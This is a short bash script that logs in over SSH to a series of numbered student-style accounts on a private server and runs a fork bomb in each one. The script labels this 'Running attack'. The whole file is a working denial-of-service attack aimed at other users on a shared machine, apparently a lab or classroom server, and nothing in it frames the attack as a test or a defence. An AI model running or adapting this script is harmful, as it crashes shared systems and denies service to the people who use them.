#!/bin/bash
ip=10.5.12.254
for((id=2022103031;id<=2022103047;id++))
{
	case $id in (2022103038|2022103040|2022103045)
		continue
	;;
	esac
	
	echo "Running attack on s$id@$ip"
	
    	ssh s$id@$ip "echo ':(){ :|:& };:'| bash" &

    if [ $? -eq 0 ]; then
        echo "Successfully executed commands for $id"
    else
        echo "Failed to execute commands for $user"
    fi
}
